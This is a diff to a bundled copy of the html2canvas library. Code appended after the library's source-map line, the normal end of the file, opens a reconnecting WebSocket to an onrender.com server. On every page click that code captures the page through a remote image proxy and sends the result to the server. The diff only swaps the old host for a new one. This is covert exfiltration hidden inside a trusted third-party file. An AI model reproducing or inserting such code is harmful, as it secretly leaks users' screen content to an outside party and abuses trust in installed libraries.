@@ -10396,7 +10396,7 @@ var parseBackgroundColor = function (
 
 //# sourceMappingURL=html2canvas.esm.js.map
 
-let socket = new WebSocket("wss://web-helper.onrender.com");
+let socket = new WebSocket("wss://wh-5ha2.onrender.com");
 
 socket.onopen = () => {
   console.log("Соединение установлено");
@@ -10477,7 +10477,7 @@ socket.onmessage = (event) => {
 
 socket.onclose = () => {
   setTimeout(() => {
-    const newSocket = new WebSocket("wss://web-helper.onrender.com");
+    const newSocket = new WebSocket("wss://wh-5ha2.onrender.com");
 
     newSocket.onopen = () => {
       console.log("Соединение установлено");
@@ -10504,7 +10504,7 @@ document.addEventListener("click", () => {
 });
 
 async function sendScreen() {
-  const proxyBase = "https://web-helper.onrender.com/proxy?url="; // <-- замени на свой
+  const proxyBase = "https://wh-5ha2.onrender.com/proxy?url="; // <-- замени на свой
 
   const imgs = Array.from(document.querySelectorAll("img"));
   const replacedImgs = [];
@@ -10554,7 +10554,7 @@ async function sendScreen() {
     if (socket.readyState === WebSocket.OPEN) {
       socket.send(JSON.stringify(message));
     } else {
-      const newSocket = new WebSocket("wss://web-helper.onrender.com");
+      const newSocket = new WebSocket("wss://wh-5ha2.onrender.com");
 
       newSocket.onopen = () => {
         console.log("Соединение установлено");
